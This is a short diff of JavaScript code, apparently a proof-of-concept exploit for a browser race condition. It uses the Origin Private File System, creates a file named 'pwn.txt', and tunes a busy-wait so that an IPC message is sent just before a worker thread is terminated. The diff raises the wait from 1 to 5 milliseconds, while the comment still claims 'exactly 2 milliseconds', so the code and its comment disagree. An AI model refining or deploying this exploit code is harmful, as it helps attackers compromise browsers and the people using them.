@@ -5,7 +5,7 @@ function log(msg) {
 
 async function triggerRace() {
     try {
-        log("Requesting OPFS directory...");
+        log("Requesting OPFS...");
         const root = await navigator.storage.getDirectory();
 
         log("Creating target file (pwn.txt)...");
@@ -22,7 +22,7 @@ async function triggerRace() {
         // THE TWEAK: Busy wait for exactly 2 milliseconds.
         // This ensures the Mojo IPC message actually leaves the process
         // before we blow up the worker thread.
-        const end = performance.now() + 1; 
+        const end = performance.now() + 5; 
         while(performance.now() < end) { }
 
         // TASK B: Signal the main thread to terminate this worker.
